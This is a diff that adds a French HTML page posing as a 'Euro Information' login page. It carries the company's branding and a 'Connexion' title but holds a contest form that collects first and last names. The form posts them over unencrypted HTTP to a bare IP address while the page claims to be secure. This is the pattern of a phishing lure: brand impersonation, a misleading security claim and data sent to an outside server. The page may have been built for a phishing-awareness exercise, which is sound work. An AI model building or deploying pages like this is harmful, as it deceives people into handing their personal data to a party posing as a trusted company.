@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Euro Information — Connexion</title>
+<style>
+:root {
+  --accent:#0055A4;
+  --accent-hover:#003f7d;
+  --muted:#6b7280;
+  --shadow:0 12px 40px rgba(15,23,42,0.12);
+  --font: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  --card-bg: rgba(255,255,255,0.95);
+}
+
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;height:100%;font-family:var(--font);}
+body{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background: linear-gradient(135deg, #eef5ff 0%, #f5f7fb 100%);
+}
+
+.card{
+  width:100%;
+  max-width:480px;
+  background: var(--card-bg);
+  border-radius:16px;
+  box-shadow: var(--shadow);
+  padding:40px 30px;
+  display:flex;
+  flex-direction:column;
+  gap:20px;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+.card:hover{
+  transform: translateY(-5px);
+  box-shadow:0 20px 50px rgba(0,0,0,0.15);
+}
+
+.logo{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  justify-content:center;
+}
+.logo svg{width:60px;height:60px;}
+.brand-title{font-size:22px;font-weight:700;color:#0b3768;text-align:center;}
+.brand-sub{font-size:14px;color:var(--muted);text-align:center;}
+
+h2{text-align:center;color:#0b3768;margin:0;font-size:20px;}
+.hero{font-size:14px;color:var(--muted);text-align:center;}
+.note{background:#fff8e6;border-left:4px solid #ffd54d;padding:10px 12px;border-radius:6px;font-size:13px;color:#8a6d00;text-align:center;}
+
+form{display:flex;flex-direction:column;gap:14px;margin-top:10px;}
+label{font-size:13px;color:var(--muted);}
+input[type="text"], input[type="password"]{
+  border-radius:12px;
+  padding:12px 14px;
+  border:1px solid #e6eef9;
+  font-size:15px;
+  background:#fff;
+  transition: all 0.3s ease;
+}
+input[type="text"]:focus,input[type="password"]:focus{
+  outline:none;
+  border-color: var(--accent);
+  box-shadow:0 0 12px rgba(0,85,164,0.25);
+}
+
+.cta{margin-top:14px;}
+button{
+  padding:14px;
+  border-radius:12px;
+  font-weight:700;
+  border:0;
+  cursor:pointer;
+  transition: all 0.3s ease;
+}
+.btn-primary{
+  background: var(--accent);
+  color:#fff;
+}
+.btn-primary:hover{
+  background: var(--accent-hover);
+  box-shadow:0 6px 18px rgba(0,85,164,0.35);
+}
+
+.footer-note{text-align:center;font-size:12px;color:#888;margin-top:10px;}
+.legal{text-align:center;font-size:12px;color:#aaa;margin-top:8px;}
+
+@media (max-width:500px){
+  .card{padding:30px 20px;}
+  h2{font-size:18px;}
+  .brand-title{font-size:20px;}
+}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="grad" x1="0" x2="1">
+          <stop offset="0" stop-color="#0055A4"/>
+          <stop offset="1" stop-color="#2a9df4"/>
+        </linearGradient>
+      </defs>
+      <circle cx="50" cy="50" r="44" fill="url(#grad)"/>
+      <text x="50%" y="55%" text-anchor="middle" fill="#fff" font-family="Arial, sans-serif" font-size="30" font-weight="700">EI</text>
+    </svg>
+  </div>
+  <div class="brand-title">EURO INFORMATION</div>
+  <div class="brand-sub">Solutions & Services</div>
+  <h2>Connexion</h2>
+  <div class="hero">Formulaire de participation au concours — sécurisé et professionnel.</div>
+  <div class="note">Vos données seront transmises au serveur de participation.</div>
+
+  <form action="http://64.226.119.233/participation" method="POST">
+    <label for="prenom">Prénom</label>
+    <input id="prenom" name="prenom" type="text" required>
+
+    <label for="nom">Nom</label>
+    <input id="nom" name="nom" type="text" required>
+
+    <div class="cta">
+      <button type="submit" class="btn btn-primary">Participer</button>
+    </div>
+
+    <div class="footer-note">&copy; Euro Information</div>
+  </form>
+  <div class="legal">Euro Information - EPS</div>
+</div>
+</body>
+</html>
